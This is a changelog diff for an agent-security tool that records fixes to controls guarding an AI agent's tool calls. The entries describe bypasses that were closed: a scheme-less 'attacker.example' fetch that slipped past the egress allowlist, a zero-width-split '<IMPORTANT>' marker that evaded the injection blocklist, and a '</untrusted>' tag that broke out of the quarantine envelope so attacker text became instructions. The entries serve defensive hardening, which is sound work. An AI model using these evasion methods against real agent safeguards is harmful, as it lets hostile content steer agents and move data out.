@@ -9,6 +9,55 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Security
 
+- **Boundary controls fail closed on an unrecognised tool** (DCR-0032, DCR-0033,
+  DCR-0034, DCR-0035), closing #8, #9. The four adapter-boundary controls
+  (`src/mylonite/scan/control_shim.py`) each answer "does this control apply to
+  this tool?" from a declared `control_config` list, then a name heuristic, and
+  previously defaulted to **pass-through** for anything neither matched — a
+  control that fails open on ambiguity, in the module that implements the exact
+  mitigations the differential oracle relies on to prove a fix works. New
+  `src/mylonite/scan/tool_classifier.py` centralizes the classification
+  contract (declared list -> structural evidence -> name hint -> fail-closed
+  default) shared by all four controls.
+  - **BEHAVIOUR CHANGE:** an egress (W3) or consequential (W4) tool call that
+    isn't declared and doesn't match a name hint is now **refused** —
+    `refused: ... no destination argument could be identified` /
+    `deferred: ... requires explicit confirmation` — instead of silently
+    reaching the inner tool unguarded. The W2 untrusted-data envelope now wraps
+    every non-error tool result by the same default. The first refusal for a
+    given tool name in a run logs a warning (once per name) with the exact
+    `control_config` snippet to declare it precisely; see "The boundary
+    controls fail closed" in `docs/target-file.md`.
+  - **Fixed:** the W3 egress allowlist's destination extractor (`_url_in`)
+    required a literal `"://"` on a single string argument, so a scheme-less
+    call like `web_fetch(host="attacker.example")` or a list-valued
+    `targets=[...]` argument reached the inner tool with the allowlist never
+    evaluated (DCR-0032). The new `tool_classifier.url_values` walks nested
+    lists/dicts and recognises a bare hostname or IP literal.
+  - **Fixed:** `EgressAllowlistControl`/`ConfirmGateControl` classified a tool
+    as egress/consequential from a small hardcoded name-substring list only;
+    an egress tool named e.g. `visit_page` (DCR-0033) or a consequential tool
+    with no matching verb (DCR-0034) matched nothing and passed through
+    unguarded regardless of what its arguments actually did.
+  - `host_allowed` now accepts a scheme-less host the same way
+    `looks_like_destination` identifies one — `urlparse` only populates
+    `.hostname` from a network-location component, so a bare allowlisted host
+    (e.g. `localhost`) previously read as host `""` and was never matched.
+- **Sanitiser strips non-ASCII before the blocklist regexes run, not after**
+  (DCR-0045). `sanitize_tool_description`'s instruction-smuggling patterns are
+  ASCII; running them before the strip let a keyword split by a zero-width
+  space or unicode tag character (e.g. `<IMP​ORTANT>`) evade every one of
+  them, and the invisible character then survived to reconstitute a live
+  smuggle marker downstream. The strip now runs first.
+- **`quarantine`'s untrusted-data envelope neutralises a literal
+  `<untrusted>`/`</untrusted>` tag in the wrapped content before wrapping**
+  (DCR-0046, the mylonite-side twin of the reference guard's `_quarantine`
+  fix). Without this, attacker-controlled content containing `</untrusted>`
+  closed the envelope early, and the text after it landed exactly where the
+  planner treats content as instruction, not data — a delimiter-injection
+  bypass of the W2 mitigation itself. A payload with no envelope tag in it
+  (every recorded demo fixture) quarantines byte-for-byte as before.
+
 - **Every persist/print/publish path now runs through redaction**, closing
   several independently-discovered credential-leak findings (DCR-0003,
   DCR-0006, DCR-0007, DCR-0010, DCR-0011, DCR-0016, DCR-0019, DCR-0021).
